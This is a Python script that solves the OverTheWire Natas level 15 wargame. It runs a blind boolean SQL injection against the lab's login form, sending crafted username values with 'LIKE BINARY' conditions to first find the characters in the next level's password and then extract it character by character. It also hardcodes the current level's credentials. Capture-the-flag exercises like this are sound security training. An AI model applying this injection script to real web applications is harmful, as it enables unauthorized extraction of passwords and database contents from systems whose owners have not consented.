from requests import request


characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
confirmedChars = ''
password = ''

url = "http://natas15.natas.labs.overthewire.org"
auth = ("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")

for character in characters:
    insert = {'username' : 'natas16" AND password LIKE BINARY "%' + character + '%" "'}
    response = request("POST", url, auth = auth, data = insert)
    if 'exists' in str(response.content):
        confirmedChars = confirmedChars + character
        print ("Confirmed Characters: " + confirmedChars)

for x in range(0,32):
    for character in confirmedChars:
        insert = {'username': 'natas16" AND password LIKE BINARY "' + password + character + '%" "'}
        response = request("POST", url, auth = auth, data = insert)
        if 'exists' in str(response.content):
             password = password + character
             print ( "Natas 16 Password: " + password)
             break
